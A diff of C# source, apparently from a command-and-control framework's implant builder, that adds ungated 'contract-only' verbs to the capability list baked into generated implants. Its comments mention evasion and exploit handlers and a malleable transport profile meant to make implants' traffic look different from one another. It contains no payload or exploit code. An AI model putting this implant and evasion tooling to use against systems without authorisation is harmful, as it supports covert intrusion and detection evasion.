@@ -208,17 +208,24 @@ public sealed class DotNetBuildUnit : IBuildUnit
     // Go/C/Nim unit out-of-tree, or this in-tree .NET unit -- must emit the same
     // keys and encoding so an implant of any language decodes the same profile.
     // The key set is exactly what the reference implant consumes (its
-    // BakedProfileSupport maps each key), plus the class verb set, which the
-    // planned implant-side capability derivation reads (architecture.md Sec 5.3).
+    // BakedProfileSupport maps each key), plus the baked verb set (the class's
+    // reduced set plus the ungated contract-only verbs), which the implant-side
+    // capability derivation reads (architecture.md Sec 5.3).
     // No key material is baked at all: the implant reads its key from the
     // teamserver at enroll time, not from the baked profile (architecture.md
     // Sec 7).
     public static string RenderBakedProfile(BuildParams @params)
     {
-        // The class's reduced verb set (architecture.md Sec 5.2), comma-joined so
-        // the artifact is self-describing: the generated implant carries the verbs
-        // it is permitted to run, baked in alongside its profile.
-        var verbs = string.Join(",", ImplantClassCapabilities.For(@params.Class));
+        // The class's reduced verb set (architecture.md Sec 5.2) plus the
+        // contract-only verbs no class gates (Sec 5.2/10.2), comma-joined so the
+        // artifact is self-describing: the generated implant carries the verbs it
+        // is permitted to run, baked in alongside its profile. The ungated
+        // contract verbs ride along so an artifact compiled with an out-of-tree
+        // evasion or exploit handler advertises the verb at handshake; the
+        // advertised set is still intersected with the compiled handlers, so an
+        // artifact without the handler never claims them.
+        var verbs = string.Join(",", ImplantClassCapabilities.For(@params.Class)
+            .Concat(ImplantClassCapabilities.Ungated));
         // The malleable transport profile (architecture.md Sec 7): the enroll
         // path, User-Agent, custom headers, request timeout, and body envelope
         // that shape the wire so two implants do not look the same. Headers ride
